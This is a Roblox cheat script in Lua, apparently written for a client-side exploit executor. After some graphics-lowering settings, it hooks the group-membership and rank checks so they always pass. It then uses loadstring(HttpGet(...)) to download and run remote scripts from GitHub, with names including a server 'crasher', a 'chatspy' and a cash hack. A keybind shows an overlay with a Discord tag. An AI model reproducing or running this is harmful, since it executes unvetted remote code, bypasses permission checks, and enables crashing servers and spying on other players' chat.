local decalsyeeted = true
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end

hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/crasher.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/chatspy.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/commands.lua"))()

Mouse.KeyDown:Connect(function(a)
    if a == "l" then
        if game.CoreGui:FindFirstChild("Redware") then
            game.CoreGui.Redware:Destroy()
        end

        Holder = Instance.new("ScreenGui")
        Frame = Instance.new("Frame")
        TextLabel = Instance.new("TextLabel")
        TextLabel_2 = Instance.new("TextLabel")
        TextLabel_3 = Instance.new("TextLabel")
        
        Holder.Name = "Redware"
        Holder.Parent = game.CoreGui
        Holder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        Holder.IgnoreGuiInset = true

        Frame.Parent = Holder
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
        Frame.Size = UDim2.new(1, 0, 1, 0)

        TextLabel.Parent = Frame
        TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel.BackgroundTransparency = 1.000
        TextLabel.Position = UDim2.new(0.5, 0, 0.49158523, 0)
        TextLabel.Size = UDim2.new(0, 300, 0, 60)
        TextLabel.Font = Enum.Font.GothamBlack
        TextLabel.Text = "eyedress#0995"
        TextLabel.TextColor3 = Color3.fromRGB(144,238,144)
        TextLabel.TextScaled = true
        TextLabel.TextSize = 14.000
        TextLabel.TextWrapped = true

        TextLabel_2.Parent = Frame
        TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
        TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_2.BackgroundTransparency = 1.000
        TextLabel_2.Position = UDim2.new(0.499739617, 0, 0.549961051, 0)
        TextLabel_2.Size = UDim2.new(0, 180, 0, 40)
        TextLabel_2.Font = Enum.Font.Nunito
        TextLabel_2.Text = game.Players.LocalPlayer.Name
        TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_2.TextScaled = true
        TextLabel_2.TextSize = 14.000
        TextLabel_2.TextWrapped = true
        
        TextLabel_3.Parent = Frame
        TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
        TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_3.BackgroundTransparency = 1.000
        TextLabel_3.Position = UDim2.new(0.499739617, 0, 0.599961051, 0)
        TextLabel_3.Size = UDim2.new(0, 180, 0, 40)
        TextLabel_3.Font = Enum.Font.TitilliumWeb
        TextLabel_3.Text = "MAIN"
        TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 0)
        TextLabel_3.TextScaled = true
        TextLabel_3.TextSize = 14.000
        TextLabel_3.TextWrapped = true
        setfpscap(2)
    elseif a == "k" then
        setfpscap(60)
        if game.CoreGui:FindFirstChild("Redware") then
            game.CoreGui.Redware:Destroy()
        end
    end
end)
